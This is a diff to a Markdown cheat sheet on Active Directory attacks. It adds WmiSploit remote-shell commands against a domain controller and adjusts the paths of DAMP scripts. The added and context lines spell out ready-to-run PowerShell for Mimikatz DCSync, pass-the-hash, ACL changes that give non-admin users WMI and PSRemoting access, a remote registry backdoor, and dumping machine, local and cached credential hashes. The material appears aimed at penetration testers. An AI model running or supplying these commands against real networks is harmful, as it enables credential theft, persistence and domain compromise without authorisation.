@@ -189,6 +189,15 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -Name create -ArgumentLis
 
 wmic dc01.corp.local list full /format:list
 ```
+There are several scripts such as `WmiSploit` that helps to create a shell or execute commands on a target (similar to PSRemoting but with WMI).
+
+```powershell
+Enter-WmiShell -ComputerName dc01.corp.local -UserName user
+Invoke-WmiCommand -ComputerName dc01.corp.local -Credential $cred -ScriptBlock {whoami}
+```
+> **Note** Import both modules `Enter-WmiShell.ps1` and `Invoke-WmiCommand` are used.
+
+* [https://github.com/secabstraction/WmiSploit](https://github.com/secabstraction/WmiSploit)
 
 ## PsExec
 
@@ -514,7 +523,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
 ```
 So once we have obtained the hash NTLM of *any user* of the domain, `PassTheHash` or `Over-PassTheHash` attack can be executed.
 
-## Security Descriptors
+# ACL Security Descriptors
 
 It is possible to modify Security Descriptors such as security information like owner, primary group, DACL and SACL of multiple remote access methods to allow access to non-admin users.
 
@@ -530,7 +539,7 @@ ACE for built-in administrators for WMI namespaces
 A;CI;CCDCLCSWRPWPRCWD;;;<SID>
 ```
 
-### WMI
+## WMI
 
 ACLs can be modified to allow non-admin users access to securable objects with `Set-RemoteWMI.ps1`:
 
@@ -548,7 +557,7 @@ And to remove permissions:
 Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace 'root\cimv2' -Remove -Verbose
 ```
 
-### PowerShell Remoting
+## PowerShell Remoting
 
 Something similar we can do it with PowerShell Remoting with the script `Set-RemotePSRemoting.ps1`.
 
@@ -560,31 +569,31 @@ Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Verbose
 Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Remove
 ```
 
-### Remote Registry
+## Remote Registry
 
 Using DAMP we can modify the registry with administrative privileges.
 
 On a remote machine with `Add-RemoteRegBackdoor.ps1` script.
 ```powershell
-Import-Module .\Add-RemoteRegBackdoor.ps1
+Import-Module .\DAMP-master\Add-RemoteRegBackdoor.ps1
 Add-RemoteRegBackdoor -ComputerName dc01.corp.local -Trustee user1 -Verbose
 ```
 After that we can execute some interesting attacks such as getting accounts and machines hashes.
 
 * Retrive machine account hash:
 ```powershell
-Import-Module .\Get-RemoteMachineAccountHash
+Import-Module .\DAMP-master\Get-RemoteMachineAccountHash
 Get-RemoteMachineAccountHash -ComputerName dc01.corp.local -Verbose
 ```
 
 * Retrieve local account hash:
 ```powershell
-Import-Module .\Get-RemoteLocalAccountHash
+Import-Module .\DAMP-master\Get-RemoteLocalAccountHash
 Get-RemoteLocalAccountHash -ComputerName dc01.corp.local -Verbose
 ```
 
 * Retrive domain cached credentials:
 ```powershell
-Import-Module .\Get-RemoteCachedCredentials
+Import-Module .\DAMP-master\Get-RemoteCachedCredentials
 Get-RemoteCachedCredentials -ComputerName dc01.corp.local -Verbose
 ```
